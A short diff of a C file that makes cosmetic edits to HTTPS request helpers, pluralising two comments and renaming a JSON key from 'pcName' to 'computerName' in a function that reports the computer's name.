@@ -58,7 +58,7 @@ Commands GetCommands(LPCSTR server, DWORD port)
 	}
 
 	//Get response
-	//Header
+	//Headers
 	CHAR headerBuffer[8192] = { 0 };
 	DWORD headerSize = sizeof(headerBuffer);
 
@@ -70,7 +70,7 @@ Commands GetCommands(LPCSTR server, DWORD port)
 		return commands;
 	}
 
-	//Print header
+	//Print headers
 	printf("----- RESPONSE ----\n");
 	printf("Headers length = %d\n", headerSize);
 	printf("|%s|\n", headerBuffer);
@@ -187,7 +187,7 @@ BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, L
 	}
 
 	//Get response
-	//Header
+	//Headers
 	CHAR headerBuffer[8192] = { 0 };
 	DWORD headerSize = sizeof(headerBuffer);
 
@@ -199,7 +199,7 @@ BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, L
 		return FALSE;
 	}
 
-	//Print header
+	//Print headers
 	printf("----- RESPONSE ----\n");
 	printf("Headers length = %d\n", headerSize);
 	printf("|%s|\n", headerBuffer);
@@ -260,7 +260,7 @@ cJSON* CreateInformationsJsonObject()
 	if (!(object = cJSON_CreateObject()))
 		return NULL;
 
-	if (!cJSON_AddStringToObject(object, "pcName", computerName))
+	if (!cJSON_AddStringToObject(object, "computerName", computerName))
 		return NULL;
 
 	return object;
